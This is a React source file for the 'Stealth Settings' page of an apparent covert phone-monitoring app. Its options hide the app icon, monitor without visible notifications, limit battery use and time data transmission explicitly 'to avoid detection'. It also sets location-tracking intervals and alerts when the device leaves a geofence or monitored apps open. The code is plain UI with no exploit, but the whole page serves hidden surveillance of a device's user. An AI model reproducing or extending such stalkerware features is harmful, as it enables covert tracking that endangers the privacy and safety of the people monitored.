import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { Layout } from "@/components/layouts/Layout";
import { 
  Card, 
  CardHeader, 
  CardTitle, 
  CardContent, 
  CardDescription,
  CardFooter
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Slider } from "@/components/ui/slider";
import { EyeOff, Shield, Activity, Clock, Bell, CheckCircle2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { queryClient } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import type { Settings } from "@shared/schema";

export default function StealthSettings() {
  const { toast } = useToast();
  const [isSaving, setIsSaving] = useState(false);
  const [settings, setSettings] = useState<Settings | null>(null);
  const [formData, setFormData] = useState({
    stealthMode: false,
    notificationsEnabled: true,
    trackingInterval: 15
  });
  
  // Get settings
  const { data: userSettings, isLoading } = useQuery<Settings>({
    queryKey: ['/api/settings'],
  });
  
  // Set form data when settings are loaded
  useEffect(() => {
    if (userSettings) {
      setSettings(userSettings);
      setFormData({
        stealthMode: userSettings.stealthMode,
        notificationsEnabled: userSettings.notificationsEnabled,
        trackingInterval: userSettings.trackingInterval
      });
    }
  }, [userSettings]);
  
  const handleSave = async () => {
    setIsSaving(true);
    
    try {
      await apiRequest('PUT', '/api/settings', formData);
      queryClient.invalidateQueries({ queryKey: ['/api/settings'] });
      
      toast({
        title: "Settings Saved",
        description: "Your stealth settings have been updated successfully.",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to save settings. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSaving(false);
    }
  };
  
  if (isLoading) {
    return (
      <Layout>
        <div className="border-b border-gray-800 bg-dark-800">
          <div className="px-4 py-3">
            <h1 className="text-xl font-bold">Stealth Settings</h1>
            <p className="text-sm text-gray-400">Configure monitoring stealth options</p>
          </div>
        </div>
        
        <div className="p-6 flex justify-center items-center">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-600"></div>
        </div>
      </Layout>
    );
  }
  
  return (
    <Layout>
      <div className="border-b border-gray-800 bg-dark-800">
        <div className="px-4 py-3">
          <h1 className="text-xl font-bold">Stealth Settings</h1>
          <p className="text-sm text-gray-400">Configure monitoring stealth options</p>
        </div>
      </div>
      
      <div className="p-4 md:p-6 flex flex-col space-y-6">
        {/* Stealth Mode Card */}
        <Card className="bg-dark-800 border-gray-800">
          <CardHeader className="px-4 py-3 border-b border-gray-800">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-base font-medium">Stealth Mode</CardTitle>
                <CardDescription className="text-gray-400">
                  Control visibility of monitoring activities
                </CardDescription>
              </div>
              <Switch 
                checked={formData.stealthMode} 
                onCheckedChange={(checked) => setFormData({...formData, stealthMode: checked})}
              />
            </div>
          </CardHeader>
          <CardContent className="p-4 space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="flex items-start space-x-3">
                <div className="h-8 w-8 rounded-lg bg-purple-900/50 flex items-center justify-center flex-shrink-0">
                  <EyeOff className="h-5 w-5 text-purple-400" />
                </div>
                <div>
                  <h3 className="text-sm font-medium">Hide App Icon</h3>
                  <p className="text-sm text-gray-500 mt-1">
                    App will not appear in the device's app drawer or recent apps
                  </p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="h-8 w-8 rounded-lg bg-blue-900/50 flex items-center justify-center flex-shrink-0">
                  <Shield className="h-5 w-5 text-blue-400" />
                </div>
                <div>
                  <h3 className="text-sm font-medium">Background Monitoring</h3>
                  <p className="text-sm text-gray-500 mt-1">
                    Monitor device activity without any visible notifications
                  </p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="h-8 w-8 rounded-lg bg-green-900/50 flex items-center justify-center flex-shrink-0">
                  <Activity className="h-5 w-5 text-green-400" />
                </div>
                <div>
                  <h3 className="text-sm font-medium">Low Resource Usage</h3>
                  <p className="text-sm text-gray-500 mt-1">
                    Optimize resource usage to avoid detection via battery monitors
                  </p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="h-8 w-8 rounded-lg bg-yellow-900/50 flex items-center justify-center flex-shrink-0">
                  <Clock className="h-5 w-5 text-yellow-400" />
                </div>
                <div>
                  <h3 className="text-sm font-medium">Scheduled Transmission</h3>
                  <p className="text-sm text-gray-500 mt-1">
                    Send data only during ideal times to avoid detection
                  </p>
                </div>
              </div>
            </div>
            
            {formData.stealthMode && (
              <div className="mt-4 bg-dark-900 rounded-md p-3 text-sm text-yellow-500 flex items-start">
                <Bell className="h-5 w-5 mr-2 flex-shrink-0" />
                <span>
                  Enabling stealth mode will minimize visible signs of monitoring but may slightly reduce
                  reliability. Some features might be delayed when operating in stealth mode.
                </span>
              </div>
            )}
          </CardContent>
        </Card>
        
        {/* Tracking Interval Card */}
        <Card className="bg-dark-800 border-gray-800">
          <CardHeader className="px-4 py-3 border-b border-gray-800">
            <CardTitle className="text-base font-medium">Tracking Interval</CardTitle>
            <CardDescription className="text-gray-400">
              Configure how often the device location is updated
            </CardDescription>
          </CardHeader>
          <CardContent className="p-4 space-y-6">
            <div>
              <div className="flex justify-between mb-2">
                <Label>Update frequency (minutes)</Label>
                <span className="text-sm font-medium">{formData.trackingInterval} mins</span>
              </div>
              <Slider
                value={[formData.trackingInterval]}
                min={5}
                max={60}
                step={5}
                onValueChange={(value) => setFormData({...formData, trackingInterval: value[0]})}
              />
              <div className="flex justify-between mt-1">
                <span className="text-xs text-gray-500">More frequent</span>
                <span className="text-xs text-gray-500">Less frequent</span>
              </div>
            </div>
            
            <div className="bg-dark-900/50 rounded-md p-3">
              <p className="text-sm text-gray-400">
                <strong>Current setting:</strong> Location data will be collected every {formData.trackingInterval} minutes.
                More frequent updates provide better tracking but may use more battery.
              </p>
            </div>
          </CardContent>
        </Card>
        
        {/* Notifications Card */}
        <Card className="bg-dark-800 border-gray-800">
          <CardHeader className="px-4 py-3 border-b border-gray-800">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-base font-medium">Notifications</CardTitle>
                <CardDescription className="text-gray-400">
                  Control when you receive alerts and notifications
                </CardDescription>
              </div>
              <Switch 
                checked={formData.notificationsEnabled} 
                onCheckedChange={(checked) => setFormData({...formData, notificationsEnabled: checked})}
              />
            </div>
          </CardHeader>
          <CardContent className="p-4">
            <div className="space-y-4">
              {formData.notificationsEnabled ? (
                <>
                  <div className="flex flex-col space-y-3">
                    <div className="flex items-center justify-between">
                      <Label htmlFor="notify-disconnected" className="flex items-center cursor-pointer">
                        <span>Device goes offline</span>
                      </Label>
                      <Switch id="notify-disconnected" defaultChecked />
                    </div>
                    
                    <div className="flex items-center justify-between">
                      <Label htmlFor="notify-location" className="flex items-center cursor-pointer">
                        <span>Device leaves geofence area</span>
                      </Label>
                      <Switch id="notify-location" defaultChecked />
                    </div>
                    
                    <div className="flex items-center justify-between">
                      <Label htmlFor="notify-battery" className="flex items-center cursor-pointer">
                        <span>Battery level below 15%</span>
                      </Label>
                      <Switch id="notify-battery" defaultChecked />
                    </div>
                    
                    <div className="flex items-center justify-between">
                      <Label htmlFor="notify-app" className="flex items-center cursor-pointer">
                        <span>Monitored apps are opened</span>
                      </Label>
                      <Switch id="notify-app" />
                    </div>
                  </div>
                  
                  <div className="bg-dark-900/50 rounded-md p-3">
                    <p className="text-sm text-gray-400">
                      You'll receive alerts based on the options you've selected above.
                      Adjust these settings to control the frequency of notifications.
                    </p>
                  </div>
                </>
              ) : (
                <div className="flex flex-col items-center justify-center py-4 text-center">
                  <Bell className="h-12 w-12 text-gray-600 mb-3" />
                  <p className="text-gray-400 mb-2">All notifications are currently disabled</p>
                  <p className="text-sm text-gray-500">
                    You won't receive any alerts about device activity.
                    Toggle the switch above to enable notifications.
                  </p>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
        
        {/* Save Button */}
        <div className="flex justify-end space-x-3">
          <Button 
            variant="outline" 
            className="bg-dark-900 border-gray-700"
            onClick={() => {
              if (settings) {
                setFormData({
                  stealthMode: settings.stealthMode,
                  notificationsEnabled: settings.notificationsEnabled,
                  trackingInterval: settings.trackingInterval
                });
              }
            }}
          >
            Reset
          </Button>
          
          <Button 
            onClick={handleSave}
            disabled={isSaving}
            className="min-w-[120px]"
          >
            {isSaving ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-white mr-2"></div>
                Saving...
              </>
            ) : (
              <>
                <CheckCircle2 className="h-4 w-4 mr-2" />
                Save Changes
              </>
            )}
          </Button>
        </div>
      </div>
    </Layout>
  );
}
